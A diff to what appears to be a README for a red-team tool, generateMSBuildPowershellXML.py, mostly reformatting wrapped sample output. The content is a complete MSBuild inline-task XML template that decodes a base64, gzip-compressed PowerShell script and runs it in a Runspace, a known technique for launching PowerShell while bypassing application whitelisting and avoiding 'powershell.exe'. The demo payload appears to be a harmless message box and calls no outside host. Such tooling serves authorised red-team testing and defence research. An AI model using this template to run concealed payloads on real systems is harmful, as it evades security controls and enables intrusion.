@@ -26,7 +26,7 @@ IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Com
 C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     Show-Msgbox.ps1
 
         :: Powershell via MSBuild inline-task XML payload generation script
-        To be used during Red-Team assignments to launch Powershell payloads without     using 'powershell.exe'
+        To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'
         Mariusz B. / mgeeky, <mb@binary-offensive.com>
 
 [?] File not recognized as PE/EXE.
@@ -42,7 +42,7 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     S
     <hwiJYmWvD />
   </Target>
   <UsingTask TaskName="hwiJYmWvD" TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v    4.0.dll" >
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
     <Reference Include="System.Management.Automation" />
       <Code Type="Class" Language="cs">
@@ -55,7 +55,7 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     S
             public class hwiJYmWvD : Task {
                 public override bool Execute() {
 
-                    byte[] payload = System.Convert.FromBase64String("JHMgPSBOZXctT2JqZ    WN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygn    SDRzSUFJOUxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbWZwNmVZM0Z4YW0    1U1RtV3NsWlZQZm1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZV    czNVJickdTcGtLTmduOXBpYTVmYVU2T05TOVhORFpGZXI2cHhjV0o2YWxPK1JWQXM0T    Xo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3    LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5    HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb    2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKTs=");
+                    byte[] payload = System.Convert.FromBase64String("JHMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygn    SDRzSUFJOUxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbWZwNmVZM0Z4YW0    1U1RtV3NsWlZQZm1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZV    czNVJickdTcGtLTmduOXBpYTVmYVU2T05TOVhORFpGZXI2cHhjV0o2YWxPK1JWQXM0T    Xo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3    LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb    2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKTs=");
                     string decoded = System.Text.Encoding.UTF8.GetString(payload);
 
                     Runspace runspace = RunspaceFactory.CreateRunspace();
@@ -89,19 +89,7 @@ C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     S
 [?] File not recognized as PE/EXE.                                                                                    
                                                                                                                   
 ------------------------------------------------------------------------------------                                  
-<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target     Name="mYOYInAFWE"><DpaYaokgauWBJbe />
-</Target><UsingTask TaskName="DpaYaokgauWBJbe" TaskFactory="CodeTaskFactory"     AssemblyFile="C:\Windows\Microsoft.Ne
-t\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"><Task><Reference     Include="System.Management.Automation" /><
-Code Type="Class" Language="cs"><![CDATA[using System.Management.Automation;using     System.Management.Automation.Run
-spaces;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class     DpaYaokgauWBJbe:Task{public ov
-erride bool Execute(){byte[]    x=System.Convert.FromBase64String("JHMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb25
-2ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFMQkxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbW    ZwNmVZM0Z4YW01U1RtV3NsWlZQZ
-m1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZVczNVJickdTcGtLTmduOXBpYTVmYVU2T05T    OVhORFpGZXI2cHhjV0o2YWxPK1J
-WQXM0TXo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3LU9iamVjdCBJTy    5TdHJlYW1SZWFkZXIoTmV3LU9ia
-mVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2Rl    XTo6RGVjb21wcmVzcykpKS5SZWF
-kVG9FbmQoKTs=");string d=System.Text.Encoding.UTF8.GetString(x);Runspace     r=RunspaceFactory.CreateRunspace();r.Open
-();Pipeline p=r.CreatePipeline();p.Commands.AddScript(d);p.Invoke();r.Close();return     true;}}]]></Code></Task></Usi
-ngTask></Project>                                                                                                     
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="mYOYInAFWE"><DpaYaokgauWBJbe /></Target><UsingTask TaskName="DpaYaokgauWBJbe" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"><Task><Reference Include="System.Management.Automation" /><Code Type="Class" Language="cs"><![CDATA[using System.Management.Automation;using System.Management.Automation.Runspaces;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class DpaYaokgauWBJbe:Task{public override bool Execute(){byte[] x=System.Convert.FromBase64String("JHMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFMQkxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbWZwNmVZM0Z4YW01U1RtV3NsWlZQZm1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZVczNVJickdTcGtLTmduOXBpYTVmYVU2T05TOVhORFpGZXI2cHhjV0o2YWxPK1JWQXM0TXo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKTs=");string d=System.Text.Encoding.UTF8.GetString(x);Runspace r=RunspaceFactory.CreateRunspace();r.Open();Pipeline p=r.CreatePipeline();p.Commands.AddScript(d);p.Invoke();r.Close();return true;}}]]></Code></Task></UsingTask></Project>                                                                                                     
 ------------------------------------------------------------------------------------                              
 ```
 
